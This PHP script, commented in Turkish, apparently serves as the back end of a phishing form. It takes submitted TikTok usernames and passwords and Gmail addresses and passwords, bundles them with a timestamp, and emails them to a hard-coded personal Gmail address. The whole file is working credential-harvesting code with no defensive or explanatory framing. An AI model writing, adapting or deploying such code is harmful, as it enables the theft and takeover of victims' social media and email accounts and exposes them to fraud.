<?php
// JSON'dan veriyi al
$data = json_decode(file_get_contents("php://input"), true);

// Gelen verileri kontrol et
$username = $data['username'] ?? '';
$password = $data['password'] ?? '';
$gmail = $data['gmail'] ?? '';
$gmailPassword = $data['gmailPassword'] ?? '';
$timestamp = date('Y-m-d H:i:s');

// Mesajı hazırla
$message = "Yeni Kayıt:\n";
if ($username) $message .= "TikTok Kullanıcı Adı: $username\n";
if ($password) $message .= "TikTok Şifre: $password\n";
if ($gmail) $message .= "Gmail: $gmail\n";
if ($gmailPassword) $message .= "Gmail Şifre: $gmailPassword\n";
$message .= "Zaman: $timestamp";

// Mail bilgileri
$to = "doganneslihan437@gmail.com";  // <- buraya kendi e-posta adresini yaz
$subject = "Yeni Form Verisi Geldi";
$headers = "From: noreply@seninsite.com";

// E-posta gönder
mail($to, $subject, $message, $headers);

// İsteğe bağlı: başarılı mesaj döndür
echo json_encode(["success" => true]);
?>
